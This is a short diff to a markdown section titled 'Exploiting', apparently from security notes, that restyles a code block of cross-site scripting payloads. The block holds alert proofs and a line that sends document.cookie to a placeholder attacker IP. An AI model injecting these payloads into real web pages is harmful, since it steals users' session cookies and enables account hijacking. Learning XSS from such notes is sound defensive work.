@@ -1,13 +1,13 @@
 ## Exploiting 
 
-```
-# Get a pop-up with the given text 
+```js
+// Get a pop-up with the given text 
 <script>alert('XSS Success')</script>
 
-# Print the cookie to the pop-up
+// Print the cookie to the pop-up
 <script>alert('Cookie:'+document.cookie)</script>
 
-# Send the cookie to a attacker controled web server
+// Send the cookie to a attacker controled web server
 <script>new Image().src='http://<<ATTACKER IP>>/'+document.cookie;</script>
 ```
 
